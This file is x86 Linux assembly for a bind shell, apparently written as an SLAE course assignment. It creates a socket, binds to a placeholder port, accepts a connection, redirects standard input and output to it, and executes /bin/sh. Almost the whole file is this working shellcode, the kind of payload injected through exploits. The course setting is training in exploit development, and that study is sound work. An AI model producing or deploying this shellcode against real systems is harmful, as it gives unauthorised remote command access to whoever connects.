; SLAE Assigment1 - Bind shell
; Author: rtmcx (rtmcx@protonmail.com)
;
; The port used is supposed to be replaced in the 'compile.sh'-script
; Otherwise, replace the port on line 69 (in hex, network byte order) 


global _start

section .text
_start:

; The following actions must be performed:
; Create a socket
; Bind the socket
; Listen for connection
; Accept a connection
; Copy socket to stdio, stdout, stderr
; Execve /bin/sh

; Socket functions are used by the socketcall syscall
; int socketcall(int call, unsigned long *args);

; socketcall = 102 (0x66) 
; /usr/include/linux/net.h 
; Socket =1     
; Bind = 2
; Listen = 4
; Accept = 5             


    ; Create a socket using socketcall
    ; sockfd = socket(int socket_family, int socket_type, int protocol);
    ; eax = 0x66    (socketcall syscall)
    ; ebx = 1 (Bind) 
    ; ecx = args for bind
; SOCKET    
    push 0x66       ; Syscall for socketcall
    pop eax         ; in eax

    push 0x1        ; Socketcall-number for socket
    pop ebx         ; Put in ebx
        
    ; Set up the args for socket
    ; cat /usr/include/linux/in.h 
    ; PUSH protocol, type and domain
    ; Protocol: TCP=0, Type: SOCK_STREAM = 1, Domain: INET = 2
    xor edi, edi    ; Make edi null
    push edi        ; This is 'Protocol' TCP = 0
    push ebx        ; ebx already has 1 in it, reuse for Type
    push byte 0x02; Inet = 2.
    mov ecx, esp    ; Put 'pointer' to args in ecx (args to socketcall)
    int 0x80        ; execute syscall. 

    ; Now we have a socketfd in eax
    xchg esi, eax   ; Save socketfd in esi (as we need it later on)


; BIND
    ; Set up args for 'Bind'
    ;   int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    
    ; ebx = socketfd (esi)
    ; ecx = args for bind (struct sockaddr) 
    ; edx length of the args
    
    ; Setup the sockaddr, push the values to the stack
    ; sockaddr (2, 9999, 0)
    ; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2
    push edi        ; edi is still 0    (ADDR_FAMILY ALL)
    push word 0xaaaa; Marker bytes for the port 
    push word 0x02  ; (AF_INET)
    mov ecx, esp    ; Put pointer to args in ecx, for use with "bind" call  
    
    inc bl          ; inc ebx to 2, for 'Bind'-socketcall number
    push 0x10       ; Size of the sockaddr struct (16 bytes)
    push ecx        ; Argv for bind
    push esi        ; esi has the socketfd in it
    mov ecx, esp    ; Put pointer to 'Bind'-args in ecx
    
    xor eax, eax    ; zero out eax 
    mov al, 0x66    ; syscall for socketcall
    int 0x80        ; Execute syscall

    
; LISTEN
    ; Setup args for 'Listen' 
    ; listen(socketfd, backlog)

    xor eax, eax    ; Make eax null
    push eax        ; push 0
    push esi        ; esi has the socketfd in it 
    
    mov ecx, esp    ; Put pointer to 'Listen'-args
    mov bl, 0x4     ; Syscall for listen
    mov al, 0x66    ; syscall for socketcall
    int 0x80        ; Execute syscall


; ACCEPT
    ; Setup args for 'Accept'
    ; accept( socketfd, struct sockaddr, sizeof sockaddr)
    ; Since we know nothing of the client, sockaddr and it's size is set to 0   
    
    push edi        ; edi is still 0 (ADDR_FAMILY ALL)
    push edi        ; 
    push esi        ; esi has the socketfd in it 

    mov ecx, esp    ; struct for sockaddr (client)
    inc bl          ; ebx has 4 since 'listen' call. Inc to make 5 for accept
    mov al, 0x66    ; syscall for socketcall
    int 0x80        ; Execute syscall


; DUP2
    ; Now we need to dup2 i/o-to client socketfd
    ; dup2(oldfd, newfd)
    
    mov ebx, eax    ; put client socketfd (returned in eax) to ebx
    xor eax, eax    ; make eax zero
    
    xor ecx, ecx    ; Zero out ecx
    mov cl, 0x03    ; Start value for counter
dup2:
    dec ecx         ; decrese ecx
    mov al, 0x3f    ; syscall for dup2
    int 0x80        ; Execute syscall
    jnz dup2        ; If ecx i not zero, next iteration


; EXECVE
    ; Setup execve
    ; execve ("/bin/sh", NULL, NULL)
    xor eax, eax    ; Zero eax
    push eax        ; push 0 used as a terminator
    push 0x68732f6e ; hs/n in hex
    push 0x69622f2f ; ib//  in hex

    ; Set up ebx for syscall
    mov ebx, esp    ; Put address to //bin/sh0x0 in ebx
    xor ecx, ecx    ; Put a zero in ecx
    xor edx, edx    ; Put a zero in edx
    mov al, 0xb     ; Syscall for execve
    int 0x80        ; Execute syscall